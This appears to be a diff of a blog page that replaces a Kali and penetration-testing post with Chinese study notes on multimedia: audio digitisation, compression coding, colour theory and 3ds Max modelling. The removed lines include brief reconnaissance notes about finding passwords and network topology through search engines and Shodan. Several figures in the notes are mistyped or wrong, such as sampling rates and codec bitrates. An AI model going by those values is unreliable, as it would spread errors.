+                <h1 id="网络多媒体"><a href="#网络多媒体" class="headerlink" title="网络多媒体"></a>网络多媒体</h1><h2 id="第一部分：基础级"><a href="#第一部分：基础级" class="headerlink" title="第一部分：基础级"></a>第一部分：基础级</h2><h3 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><h4 id="1-媒体的类型："><a href="#1-媒体的类型：" class="headerlink" title="1.媒体的类型："></a>1.媒体的类型：</h4><p>感觉媒体：感觉媒体是指直接作用于人们的感觉器官，从而能使人产生直接感觉的媒体。感觉媒体包括人类的语言、音乐和自然界的各种声音、活动图像、图形、动画及文本等。</p>
+<p>表示媒体：表示媒体是指为了传输感觉媒体而人为研究出来的媒体。借助于此种媒体，便能更有效的存储或传输感觉媒体。如语言编码、电报码等。</p>
+<p>存储媒体：存储媒体是指用于存储表示媒体的物理介质。如纸张、磁带、磁盘、光盘等。</p>
+<p>显示媒体：显示媒体是指用于通信中使电信号和感觉媒体之间产生转换用的媒体。如输入、输出设施，键盘、鼠标、显示器、打印机等。</p>
+<p>传输媒体：传输媒体是指用于传输表示媒体的物理介质。传输媒体的种类很多，如电话线、双绞线、同轴电缆、光纤、无线电和红外线等。</p>
+<h4 id="2-多媒体的基本特征"><a href="#2-多媒体的基本特征" class="headerlink" title="2.多媒体的基本特征"></a>2.多媒体的基本特征</h4><p>多样性、交互性、集成性、实时性。</p>
+<h4 id="3-多媒体计算机系统的层次结构"><a href="#3-多媒体计算机系统的层次结构" class="headerlink" title="3.多媒体计算机系统的层次结构"></a>3.多媒体计算机系统的层次结构</h4><p>第一层：硬件系统，包含多媒体外部设备及计算机硬件</p>
+<p>第二层：软件系统，包括多媒体文件系统、操作系统、通信软件；</p>
+<p>第三层：应用程序接口，包含多媒体应用程序接口；</p>
+<p>第四层：著作工具及软件，包含图形处理、图像处理、音频处理、视频处理；</p>
+<p>第五层：应用系统，多媒体应用作品，如游戏、数字电影、教育课件、模拟器等。</p>
+<p>使用Authorware 开发的《多媒体技术》课件属于多媒体创作工具</p>
+<p>多媒体工具应具备将不同媒体信息编入程序的能力、时间控制能力、调试能力、动态文输入和输出的能力等。</p>
+<h4 id="4-流媒体技术应用"><a href="#4-流媒体技术应用" class="headerlink" title="4.流媒体技术应用"></a>4.流媒体技术应用</h4><p>远程教学；在线学习；网上培训、教学；娱乐休闲。</p>
+<h4 id="5-常见的视频制式特点"><a href="#5-常见的视频制式特点" class="headerlink" title="5.常见的视频制式特点"></a>5.常见的视频制式特点</h4><p>1.AVI视频格式：优点是图像质量好，可以跨多个平台使用，但是其缺点是体积过于庞大，并且更加糟糕的事压缩标准不统一。</p>
+<p>2.MPEG视频格式：家里常看的VCD、SVCD、DVD就是这种格式。这种视频格式的文件扩展名包括：.mpg、.mlv、.mpe、.mpeg及VCD光盘中的.dat文件等。MPEG格式目前有三种压缩格式：MPEG-1、MPEG-2、MPEG-4。</p>
+<p>3.RMVB视频格式：这是一种由RM视频格式升级延伸出的新视频格式，他的先进之处在于RMVB视频格式打破了原先RM格式那种平均压缩采样的方式，在保证平均压缩比的基础上合理利用比特率资源，就是说静止和动作场面少的画面场景采用较低的编码速率，这样可以留出更多的宽带空间，而这些宽带会在出现快速运动的画面场景时被利用。</p>
+<p>4.FLV视频格式：它形成的文件极小、加载速度极快，丰富多样的资源</p>
+<p>5.MOV视频格式：是由美国的苹果公司开发的，默认的播放器是苹果的QuickTime Player具有较高的压缩比率和较完美的视频清晰度，最大的特点是跨平台，不仅是mac系统可以使用，而且windows系统同样可以使用。</p>
+<p>6.ASF视频格式：由微软公司推出的高级流格式，也是一个在Internet上实施传播多媒体的技术标准。优点包括本地或网络回放、可扩充的媒体类型、部件下载、以及扩展性等。</p>
+<p>7.DivX视频格式：是由MPEG-4衍生出的另一种视频编码（压缩）标准，也就是我们通常所说的DVDrip格式，这种编码对机器的要求也不高，所以DivX视频编码技术可以说是一种对DVD造成威胁最大的新生视频压缩格式。</p>
+<p>8.DV-AV1视频格式：是由索尼、松下、JVC等多家厂商联合提出的一种家用数字视频格式。目前非常流行的数码相机就是使用这种格式记录视频数据的。</p>
+<p>9.WMV视频格式：是微软推出的一种采用独立编码方式并且可以直接在网上实时观看视频节目的文件压缩格式。优点包括：本地或网络回放、可扩充的媒体类型、部件下载、可伸缩的媒体类型、流的优先级化、多语言支持、环境独立性、丰富的流间关系以及扩展性等。</p>
+<p>10.MKV视频格式：是民间流行的一种视频格式，以它兼容众多视频编码见长，可以是DivX、XviD、RealVideo、H264、MPEG2、VC1等等。但是由于是民间格式，没有版权显示，又易于播放，所以官方发布的视频影片都不采用mkv，网上制作下载常见。</p>
+<p>11.TS视频格式：是高清专用封装容器。多见于原版的蓝光，HDDVD转换的视频影片，一般采用H254，VC1等最新的视频编码。</p>
+<p>12.VCD视频格式</p>
+<h3 id="二、声音信息的数字化"><a href="#二、声音信息的数字化" class="headerlink" title="二、声音信息的数字化"></a>二、声音信息的数字化</h3><h4 id="1-模拟音频的特征——声音三要素、可听音域范围"><a href="#1-模拟音频的特征——声音三要素、可听音域范围" class="headerlink" title="1.模拟音频的特征——声音三要素、可听音域范围"></a>1.模拟音频的特征——声音三要素、可听音域范围</h4><h4 id="2-声音数字化过程三步骤——采样、量化、编码；"><a href="#2-声音数字化过程三步骤——采样、量化、编码；" class="headerlink" title="2.声音数字化过程三步骤——采样、量化、编码；"></a>2.声音数字化过程三步骤——采样、量化、编码；</h4><p>声音数字化三要素：</p>
+<table>
 <thead>
 <tr>
-<th>AFRINIC</th>
-<th><a href="http://www.afrincic.net" target="_blank" rel="noopener">http://www.afrincic.net</a></th>
+<th>采样频率</th>
+<th>量化位数</th>
+<th>声道数</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>APNIC</td>
-<td><a href="http://www.apnic.net" target="_blank" rel="noopener">http://www.apnic.net</a></td>
+<td>每秒钟抽取声波幅度样本的次数</td>
+<td>每个采样点用多少二进制位表示数据范围</td>
+<td>使用声音通道的个数</td>
 </tr>
 <tr>
-<td>ARIN</td>
-<td><a href="http://www.arin.net" target="_blank" rel="noopener">http://www.arin.net</a></td>
+<td>采样频率越高，声音质量越好，数据量也越大</td>
+<td>量化位数越多，音质越好，数据量也越大</td>
+<td>立体声比单声道的表现力丰富，但数据量翻倍</td>
 </tr>
 <tr>
-<td>LANA</td>
-<td><a href="http://www.iana.com" target="_blank" rel="noopener">http://www.iana.com</a></td>
-</tr>
-<tr>
-<td>ICANN</td>
-<td><a href="http://www.lcann.org" target="_blank" rel="noopener">http://www.lcann.org</a></td>
-</tr>
-<tr>
-<td>LACNIC</td>
-<td><a href="http://www.lacnic.net" target="_blank" rel="noopener">http://www.lacnic.net</a></td>
-</tr>
-<tr>
-<td>NRO</td>
-<td><a href="http://www.nro.net" target="_blank" rel="noopener">http://www.nro.net</a></td>
-</tr>
-<tr>
-<td>RIPE</td>
-<td><a href="http://www.ripe.net" target="_blank" rel="noopener">http://www.ripe.net</a></td>
-</tr>
-<tr>
-<td>InterNic</td>
-<td><a href="http://www.internic.net" target="_blank" rel="noopener">http://www.internic.net</a></td>
+<td>11.925KHz<br>22.05kHz<br>44.1kHz</td>
+<td>8位=256个值<br>16位=65536个值</td>
+<td>单声道<br>立体声</td>
 </tr>
 </tbody></table>
-<h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><p>搜索引擎可以找到：公司新闻动态、重要雇员信息、机密文档/网络拓扑、用户名密码、目标系统软硬件技术架构</p>
-<h4 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN"></a>SHODAN</h4><p>SHODAN是一个可以搜索联网设备的搜索引擎</p>
+<p>采样就是找点、量化就会死找值</p>
+<p>采样是第一步，之后才能做量化</p>
+<p>A/D和D/A转换器：模拟信号和数字信号可以互相转换</p>
+<p>采样-&gt;A/D-&gt;编码-&gt;压缩-&gt;传输-&gt;D/A（低通滤波器）</p>
+<p>奈奎斯特理论：只有采样频率高于声音信号最高频率的两倍时，才能把数字信号表示的声音还原称为原来的声音。</p>
+<p>存储的先后顺序：编码-&gt;压缩-&gt;解码-&gt;存储</p>
+<p>数据压缩是指按照一定的算法，将冗余的数据转换成一种相对节省空间的数据表达格式，便于信息的保存和传输，压缩后的信息必须通过解压缩才能恢复。</p>
+<p>数据的压缩处理实际包括数据的压缩和解压过程，压缩是编码过程，解压是解码过程。</p>
+<h5 id="多媒体数据压缩的分类"><a href="#多媒体数据压缩的分类" class="headerlink" title="多媒体数据压缩的分类"></a>多媒体数据压缩的分类</h5><h6 id="1-冗余压缩法：也称无损压缩或无失真压缩"><a href="#1-冗余压缩法：也称无损压缩或无失真压缩" class="headerlink" title="1.冗余压缩法：也称无损压缩或无失真压缩"></a>1.冗余压缩法：也称无损压缩或无失真压缩</h6><p>为保留原始多媒体对象（包括图像、语音和视频）而设计的。</p>
+<h6 id="2-有损压缩：也称有失真压缩"><a href="#2-有损压缩：也称有失真压缩" class="headerlink" title="2.有损压缩：也称有失真压缩"></a>2.有损压缩：也称有失真压缩</h6><p>有损压缩技术主要的应用领域是在影像节目、可视电话会议和多媒体网络这样的由音频、彩色图像和视频组成的多媒体应用中，并且得到了广泛的应用。</p>
+<h6 id="3-编码"><a href="#3-编码" class="headerlink" title="3.编码"></a>3.编码</h6><p>无损压缩-&gt;统计编码：行程编码、哈夫曼编码、算术编码、香农编码、LZW编码</p>
+<p>有损压缩-&gt;PCM编码</p>
+<p>​                -&gt;预测编码：DPCM编码、ADPCM编码、帧间预测编码</p>
+<p>​                -&gt;变换编码：离散余弦变换、K-L变换、小波变换</p>
+<p>​                -&gt;混合编码：JPEG、MPEG、H.261</p>
+<h4 id="3-数字音频质量的评定标准"><a href="#3-数字音频质量的评定标准" class="headerlink" title="3.数字音频质量的评定标准"></a>3.数字音频质量的评定标准</h4><p>等级由高到低的顺序是：DAT、CD、FM、AM 和数字电话</p>
+<table>
+<thead>
+<tr>
+<th>音频质量</th>
+<th>采样频率kHz</th>
+<th>采样精度bit</th>
+<th>声道形式</th>
+<th>数码率kbps</th>
+<th>频带Hz</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DAT</td>
+<td>48</td>
+<td>16</td>
+<td>立体声</td>
+<td>1536</td>
+<td>20～20000</td>
+</tr>
+<tr>
+<td>CD</td>
+<td>44.1</td>
+<td>16</td>
+<td>立体声</td>
+<td>1411.2</td>
+<td>20～20000</td>
+</tr>
+<tr>
+<td>FM</td>
+<td>22.05</td>
+<td>16</td>
+<td>立体声</td>
+<td>705.6</td>
+<td>20～15000</td>
+</tr>
+<tr>
+<td>AM</td>
+<td>11.025</td>
+<td>8</td>
+<td>单声道</td>
+<td>88.2</td>
+<td>50～7000</td>
+</tr>
+<tr>
+<td>电话</td>
+<td>8</td>
+<td>8</td>
+<td>单声道</td>
+<td>64</td>
+<td>200～3400</td>
+</tr>
+</tbody></table>
+<p>例如：为何 CD 音质要比电话音质好？</p>
+<p>① 考虑采样频率的高低。 </p>
+<p>CD 音质的采样频率是 44.1KHz，电话音质的采样频率只有 8KHz，CD 音质能还原出更多的声音。</p>
+<p>② 频带范围覆盖不同。</p>
+<p>CD 音质的频带范围是 10<del>20Khz，能表现人耳可听阈的所有声音；电话音质的频带范围是 200</del>3400K，仅能表现人声范围的有效声音</p>
+<h4 id="4-数字音频数据量的计算——注意单位的转换（使用KB或MB）"><a href="#4-数字音频数据量的计算——注意单位的转换（使用KB或MB）" class="headerlink" title="4.数字音频数据量的计算——注意单位的转换（使用KB或MB）"></a>4.数字音频数据量的计算——注意单位的转换（使用KB或MB）</h4><p>可先算出比特率，再计算数据量</p>
+<p>数据量：v=f*b*s/8</p>
+<p>f：采样频率；b：数据位数；s：声道数。</p>
+<p><strong>电话音质用KB；CD音质用MB</strong></p>
+<p>例如：4 分钟的 CD 音乐的数据量计算：v=fbs/8</p>
+<p>44100Hz/秒 * 2B(16b)/样 * 2 声道 * 60 秒 * 4 分钟 = 40.37MB</p>
+<h3 id="三、数据压缩技术"><a href="#三、数据压缩技术" class="headerlink" title="三、数据压缩技术"></a>三、数据压缩技术</h3><h4 id="1-冗余度类型的划分：空间、时间、结构、知识、视觉、信息熵"><a href="#1-冗余度类型的划分：空间、时间、结构、知识、视觉、信息熵" class="headerlink" title="1.冗余度类型的划分：空间、时间、结构、知识、视觉、信息熵"></a>1.冗余度类型的划分：空间、时间、结构、知识、视觉、信息熵</h4><p>数据压缩编码的可能性——冗余数据</p>
+<p>空间冗余——空间连贯性</p>
+<p>时间冗余——相邻帧的相关性</p>
+<p>结构冗余——图形结构的重复性</p>
+<p>只是冗余——先验知识</p>
+<p>视觉冗余——敏感度（视觉阈值）</p>
+<p>信息熵冗余——信源编码本身包含数据的冗余</p>
+<h4 id="2-数据压缩的评定标准——压缩比、还原的速度、压缩与解压缩的速度"><a href="#2-数据压缩的评定标准——压缩比、还原的速度、压缩与解压缩的速度" class="headerlink" title="2.数据压缩的评定标准——压缩比、还原的速度、压缩与解压缩的速度"></a>2.数据压缩的评定标准——压缩比、还原的速度、压缩与解压缩的速度</h4><h4 id="3-熵的定义——平均不确定的度量值"><a href="#3-熵的定义——平均不确定的度量值" class="headerlink" title="3.熵的定义——平均不确定的度量值"></a>3.熵的定义——平均不确定的度量值</h4><p>信息量：不确定的量度，信息量=数据量-冗余量</p>
+<p>熵是信息量的度量方式，含义是信源S发出任意一个随机变量的平均信息量。</p>
+<p>概率越小的事件包含的信息量越大。</p>
+<h4 id="4-熵的作用——利用熵值来衡量是否为最佳编码定理，是平均码长的最优化值"><a href="#4-熵的作用——利用熵值来衡量是否为最佳编码定理，是平均码长的最优化值" class="headerlink" title="4.熵的作用——利用熵值来衡量是否为最佳编码定理，是平均码长的最优化值"></a>4.熵的作用——利用熵值来衡量是否为最佳编码定理，是平均码长的最优化值</h4><h4 id="5-行程编码（游程编码）"><a href="#5-行程编码（游程编码）" class="headerlink" title="5.行程编码（游程编码）"></a><strong>5.行程编码（游程编码）</strong></h4><p>基本思想：数据项d在输入流中连续出现n次，则以单个字符对nd替换n次出现者。</p>
+<p>例如，字符串AAABCDDDDDDDDBBBBB，使用游程编码完成压缩，请计算压缩比。</p>
+<p>字符串可表示为：(3)ABC(8)D(5)B，假设行程长度用1字节存储，则占用2+1+1+2+2=8B，原字符串长度为18B，即压缩比为18:8=2.25:1</p>
+<h4 id="6-算术编码的压缩与解码流程"><a href="#6-算术编码的压缩与解码流程" class="headerlink" title="6.算术编码的压缩与解码流程"></a>6.算术编码的压缩与解码流程</h4><p>算术编码原理：将编码的信息表示成实数0和1之间的一个间隔[0,1)，信息越长，编码间隔就越小，表示这一间隔所需的二进制位数就越长。</p>
+<p>例：A，B，C    PA=0.4，PB=0.5，PC=0.1</p>
+<p>BBBC</p>
+<p>1、将[0,1)分为[0,0,4)，[0.4,0.9)，[0.9,1)</p>
+<p>2、第一个字符为B，将[0,1)缩小为[0.4,0.9)</p>
+<p>0.9-0.4=0.5</p>
+<p>0.5*0.4=0.2    0.5*0.5=0.25    0.5*0.1=0.05</p>
+<p>[0.4,0.9)分为[0.4,0.6)    [0.6,0.85)    [0.85,0.9)</p>
+<p>3、第二个字符仍为B，将[0.4,0.9)缩小为[0.6,0.85)</p>
+<p>得[0.6,0.7)    [0.7,0.825)    [0.825,0.85)</p>
+<p>4、第三个字符仍为B，缩小为[0.7,0.825]</p>
+<p>0.825-0.7=0.125</p>
+<p>5、第四个字符为C，则区间缩小为</p>
+<p>0.125*0.1=0.0125</p>
+<p>0.825-0.0125=0.8125</p>
+<p>[0.8125,0.8250)</p>
+<h4 id="7-数据压缩标准"><a href="#7-数据压缩标准" class="headerlink" title="7.数据压缩标准"></a>7.数据压缩标准</h4><h5 id="音频压缩标准"><a href="#音频压缩标准" class="headerlink" title="音频压缩标准"></a>音频压缩标准</h5><p>数据：宽带为200Hz~3.4kHz，采样频率为8KHz，采样精度为8bit，传输速率为64kb/s(kbps)</p>
+<p>语音压缩标准：G.722(64kb/s)、G.7221(32kb/s)、G.728(16kb/s)和G.729(8kb/s)</p>
+<p>应用：数字电话通信。</p>
+<h5 id="高保真立体声宽带音频压缩标准"><a href="#高保真立体声宽带音频压缩标准" class="headerlink" title="高保真立体声宽带音频压缩标准"></a>高保真立体声宽带音频压缩标准</h5><p>数据：采样频率44.1kHz，采样精度16bit，速率为每声道705kb/s</p>
+<p>语音压缩标准：MPEG音频</p>
+<p>MPEG-1音频：</p>
+<p>层1（简化的ASPEC）</p>
+<p>层2（即MUSICAM，又称MP2）</p>
+<p>层3（又称MP3）</p>
+<p>MPEG-2音频：多声道，5.1省道形式及7，1声道形式</p>
+<h2 id="第二部分：PS图形图像处理"><a href="#第二部分：PS图形图像处理" class="headerlink" title="第二部分：PS图形图像处理"></a>第二部分：PS图形图像处理</h2><h3 id="一、色彩理论部分"><a href="#一、色彩理论部分" class="headerlink" title="一、色彩理论部分"></a>一、色彩理论部分</h3><h4 id="1-图形与图像的区别"><a href="#1-图形与图像的区别" class="headerlink" title="1.图形与图像的区别"></a>1.图形与图像的区别</h4><table>
+<thead>
+<tr>
+<th>图形</th>
+<th>图像</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>数据量小</td>
+<td>数据量大</td>
+</tr>
+<tr>
+<td>有结构、便于编辑修改</td>
+<td>无结构，不便于编辑修改</td>
+</tr>
+<tr>
+<td>放大缩小不失真</td>
+<td>放大缩小都可能失真</td>
+</tr>
+<tr>
+<td>能准确表示3D景物<br>易于生成所需的不同视图</td>
+<td>3D景物的信息一部分丢失很难生成不同视图</td>
+</tr>
+<tr>
+<td>经过图元-&gt;像素矩阵转换显示</td>
+<td>直接快速显示</td>
+</tr>
+<tr>
+<td>适合表现简单、规范的几何图形</td>
+<td>适合表现自然景物</td>
+</tr>
+</tbody></table>
+<h4 id="2-颜色的三要素——HSB或HIS"><a href="#2-颜色的三要素——HSB或HIS" class="headerlink" title="2.颜色的三要素——HSB或HIS"></a>2.颜色的三要素——HSB或HIS</h4><h5 id="色相——H"><a href="#色相——H" class="headerlink" title="色相——H"></a>色相——H</h5><h5 id="亮度、色调、饱和度S"><a href="#亮度、色调、饱和度S" class="headerlink" title="亮度、色调、饱和度S"></a>亮度、色调、饱和度S</h5><p>亮度是发射光或物体反射光明亮度程度的量度B</p>
+<p>饱和度：颜色强度的度量。</p>
+<p>对于同一色调的彩色光，饱和度越深颜色越鲜明或者越纯。</p>
+<h5 id="对比度"><a href="#对比度" class="headerlink" title="对比度"></a>对比度</h5><h4 id="3-加色原理与减色原理"><a href="#3-加色原理与减色原理" class="headerlink" title="3.加色原理与减色原理"></a>3.加色原理与减色原理</h4><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/06/duo-mei-ti-zong-jie/%E5%9B%BE1.png" alt=""></p>
+<p>青色变黄色=&gt;复制背景，选择-&gt;色彩范围-&gt;容差值选中青色；图像-&gt;通道混合器-&gt;蓝色(B)去掉,关闭-&gt;再次打开，再加上红色，黄色就出现了。</p>
+<p>黄色是因为蓝色被吸收；青色是因为红色被吸收；品红是因为绿色被吸收。</p>
+<h4 id="4-位图图像的基本属性"><a href="#4-位图图像的基本属性" class="headerlink" title="4.位图图像的基本属性"></a>4.位图图像的基本属性</h4><h5 id="（1）图像分辨率与屏幕分辨率的关系"><a href="#（1）图像分辨率与屏幕分辨率的关系" class="headerlink" title="（1）图像分辨率与屏幕分辨率的关系"></a>（1）图像分辨率与屏幕分辨率的关系</h5><p>屏幕分辨率要大于等于图像分辨率才能看到全部</p>
+<p>图像分辨率：单位：ppi(像素每英寸)</p>
+<p>屏幕分辨率：显示器上每单位长度显示的像素数目，通常以点/英寸(dpi)为单位。</p>
+<h5 id="（2）简单色、基本色、增强色、真彩色"><a href="#（2）简单色、基本色、增强色、真彩色" class="headerlink" title="（2）简单色、基本色、增强色、真彩色"></a>（2）简单色、基本色、增强色、真彩色</h5><h5 id="（3）图像文件的数据量——图像数据量大小-B-像素总数-像素深度-8"><a href="#（3）图像文件的数据量——图像数据量大小-B-像素总数-像素深度-8" class="headerlink" title="（3）图像文件的数据量——图像数据量大小(B)=像素总数*像素深度/8"></a>（3）图像文件的数据量——图像数据量大小(B)=像素总数*像素深度/8</h5><h2 id="第三部分：三维建模、交互动画"><a href="#第三部分：三维建模、交互动画" class="headerlink" title="第三部分：三维建模、交互动画"></a>第三部分：三维建模、交互动画</h2><h3 id="一、动画的基本原理"><a href="#一、动画的基本原理" class="headerlink" title="一、动画的基本原理"></a>一、动画的基本原理</h3><p>视觉暂留现象。</p>
+<h4 id="二、基本动画制作"><a href="#二、基本动画制作" class="headerlink" title="二、基本动画制作"></a>二、基本动画制作</h4><h5 id="1-计算机动画的分类"><a href="#1-计算机动画的分类" class="headerlink" title="1.计算机动画的分类"></a>1.计算机动画的分类</h5><p>从动画的视觉空间上划分，动画可分为二维动画和三维动画。</p>
+<h5 id="2-三维模型建模方法的总结"><a href="#2-三维模型建模方法的总结" class="headerlink" title="2.三维模型建模方法的总结"></a>2.三维模型建模方法的总结</h5><p>基本几何体、扩展几何体、二维样条线、修改器、多边形建模、粒子系统</p>
+<p>常见的修改器：挤出、倒角、车削、弯曲、锥化、扭曲、晶格、FFD、网格平滑、细化等。</p>
+<p>弯曲修改器：将当前选定对象围绕指定的轴向产生弯曲变形的效果。该项修改器常用于制作管道、旋转楼梯或人体弯腰等效果。</p>
+<p>锥化修改器：通过缩放对象的两端产生锥化效果，一端放大而另一端缩小，例如制作铅笔。</p>
+<p>扭曲修改器：以根据制定的轴向市对象产生扭曲变形，该效果就像拧湿抹布的效果。</p>
+<p>晶格：将图形的线段或边转换为网格结构。</p>
+<p>自由形式变形（FFD）修改器：整体调节模型表面的效果，客队控制点、晶格和设置体积进行调节。</p>
+<p>网格平滑：增加网格面产生平滑效果。</p>
+<p>细化：对选择的模型或者次物体级进行细化分，一产生更多的面。</p>
+<h4 id="5-3dsMax制作动画的一般步骤"><a href="#5-3dsMax制作动画的一般步骤" class="headerlink" title="5.3dsMax制作动画的一般步骤"></a>5.3dsMax制作动画的一般步骤</h4><h5 id="1⃣️建模："><a href="#1⃣️建模：" class="headerlink" title="1⃣️建模："></a>1⃣️建模：</h5><p>观察建模对象的特征，利用二维线条或三维模型完成建模设置，常用的方法有挤出、车削、布尔、网格细化等。</p>
+<h5 id="2⃣️材质贴图："><a href="#2⃣️材质贴图：" class="headerlink" title="2⃣️材质贴图："></a>2⃣️材质贴图：</h5><p>根据建模对象的特征，先确定材质，在设置贴图。材质可选择建筑材质、双面材质、多维子对象等选项，常用的贴图通道有漫反射贴图、凹凸贴图及镜面贴图等。</p>
+<h5 id="3⃣️灯光与环境："><a href="#3⃣️灯光与环境：" class="headerlink" title="3⃣️灯光与环境："></a>3⃣️灯光与环境：</h5><p>确定主光源及辅助光源。可选择聚光灯及泛光灯，设置主光源的光亮强度、衰减距离及阴影类型。</p>
+<h5 id="4⃣️设置动画："><a href="#4⃣️设置动画：" class="headerlink" title="4⃣️设置动画："></a>4⃣️设置动画：</h5><p>添加摄像机，调整合适角度及距离后，创建关键帧动画或自动关键帧动画。</p>
+<h5 id="5⃣️渲染输出："><a href="#5⃣️渲染输出：" class="headerlink" title="5⃣️渲染输出："></a>5⃣️渲染输出：</h5><p>根据输出文件格式的要求，设置渲染输出保存路径及文件格式，在渲染设置对话框中完成相关设置，也可安装渲染插件，完成环境效果的增强效果，输出最终成品。</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -1185,7 +1044,7 @@ find / -name dnsenum            #此命令用于查找字典文件位置和dpkg�
                     </span>
                     <a href="https://bbsamedi.github.io" class="b-link-green">Dusk</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2020/08/18/kali/" class="b-link-green">kali</a>
+                    <a href="/2020/09/06/duo-mei-ti-zong-jie/" class="b-link-green">多媒体总结</a>
                 </p>
             </div>
 
@@ -1505,46 +1364,49 @@ find / -name dnsenum            #此命令用于查找字典文件位置和dpkg�
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/08/21/blog/">
+                <a href="/2020/09/06/duo-mei-ti-zong-jie/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="blog博客搭建">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="多媒体总结">
                         
-                        <span class="card-title">blog博客搭建</span>
+                        <span class="card-title">多媒体总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            乱七八糟的收集了一些
+                            网络多媒体第一部分：基础级一、基本概念1.媒体的类型：感觉媒体：感觉媒体是指直接作用于人们的感觉器官，从而能使人产生直接感觉的媒体。感觉媒体包括人类的语言、音乐和自然界的各种声音、活动图像、图形、动画及文本等。
+表示媒体：表示媒体是指为了传
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-08-21
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-09-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/blog/" class="post-category" target="_blank">
-                                    blog
+                            <a href="/categories/网络多媒体/" class="post-category" target="_blank">
+                                    网络多媒体
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/blog/" target="_blank">
-                        <span class="chip bg-color">blog</span>
+                    <a href="/tags/网络多媒体/" target="_blank">
+                        <span class="chip bg-color">网络多媒体</span>
                     </a>
                     
                 </div>
@@ -1558,35 +1420,31 @@ find / -name dnsenum            #此命令用于查找字典文件位置和dpkg�
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/07/26/shen-tou-ce-shi-zong-jie/">
+                <a href="/2020/08/26/linux-fu-wu-qi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="渗透测试总结">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="linux服务器">
                         
-                        <span class="card-title">渗透测试总结</span>
+                        <span class="card-title">linux服务器</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            掌控安全web渗透总结
+                            在linux上搭建的一些服务的小总结
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-26
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-08-26
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/渗透测试/" class="post-category" target="_blank">
-                                    渗透测试
-                                </a>
-                            
-                            <a href="/categories/渗透测试/web安全/" class="post-category" target="_blank">
-                                    web安全
+                            <a href="/categories/linux/" class="post-category" target="_blank">
+                                    linux
                                 </a>
                             
                             
@@ -1596,12 +1454,8 @@ find / -name dnsenum            #此命令用于查找字典文件位置和dpkg�
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/渗透测试/" target="_blank">
-                        <span class="chip bg-color">渗透测试</span>
-                    </a>
-                    
-                    <a href="/tags/web安全/" target="_blank">
-                        <span class="chip bg-color">web安全</span>
+                    <a href="/tags/linux/" target="_blank">
+                        <span class="chip bg-color">linux</span>
                     </a>
                     
                 </div>
